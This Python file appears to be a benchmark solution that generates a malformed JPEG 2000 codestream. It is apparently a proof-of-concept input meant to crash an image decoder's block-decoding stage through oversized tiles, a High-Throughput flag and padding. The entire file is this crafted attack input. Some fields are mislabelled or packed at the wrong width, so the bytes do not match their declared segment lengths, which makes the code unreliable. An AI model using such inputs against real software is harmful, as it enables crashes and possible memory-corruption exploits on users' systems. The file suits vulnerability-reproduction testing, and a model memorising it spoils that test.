import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\xff\x4f'  # SOC
        siz_marker = b'\xff\x52'
        siz_data = b'\x00\x00'  # Isiz
        siz_data += struct.pack('>I', 1)  # Xsiz
        siz_data += struct.pack('>I', 1)  # Ysiz
        siz_data += struct.pack('>I', 0)  # XOsiz
        siz_data += struct.pack('>I', 0)  # YOsiz
        siz_data += struct.pack('>I', 65536)  # XTsiz large
        siz_data += struct.pack('>I', 65536)  # YTsiz large
        siz_data += struct.pack('>I', 0)  # XTOsiz
        siz_data += struct.pack('>I', 0)  # YTOsiz
        siz_data += struct.pack('>H', 1)  # Csiz
        siz_data += b'\x07\x01\x01'  # Ssiz, XRsiz, YRsiz
        lsiz = len(siz_data)
        poc += siz_marker + struct.pack('>H', lsiz) + siz_data
        # COD with HT and precinct
        cod_marker = b'\xff\x5c'
        scod = b'\x41'  # 0x41: precinct used (bit0), HT (bit6)
        sgcod = b'\x00\x00\x00\x01\x00'  # D=0, progression=0, layers=1, MCT=0
        precinct = b'\x00'  # large precinct for level 0
        cbstyle = b'\x0f'  # max codeblock 256x256
        cod_data = scod + sgcod + precinct + cbstyle
        lcod = len(cod_data)
        poc += cod_marker + struct.pack('>H', lcod) + cod_data
        # QCD
        qcd_marker = b'\xff\x5d'
        sqcd = b'\x00'
        qdata = b'\x1f\x80'  # default quantization
        qcd_data = sqcd + qdata
        lqcd = len(qcd_data)
        poc += qcd_marker + struct.pack('>H', lqcd) + qcd_data
        # SOT for tile 0
        sot_marker = b'\xff\x90'
        lsot = 10
        sot_data = struct.pack('>H', 0)  # Isot=0
        sot_data += struct.pack('>I', 0)  # Psot=0 (whole tile)
        sot_data += b'\x00'  # TPsot=0
        sot_data += struct.pack('>H', 1)  # TNsot=1
        poc += sot_marker + struct.pack('>H', lsot) + sot_data
        # SOD
        poc += b'\xff\x93'
        # Packet body: some data to trigger decoding
        poc += b'\x00' * 1400  # padding to reach T1
        # EOC
        poc += b'\xff\xd9'
        # Trim or pad to 1479
        if len(poc) < 1479:
            poc += b'\x00' * (1479 - len(poc))
        else:
            poc = poc[:1479]
        return poc
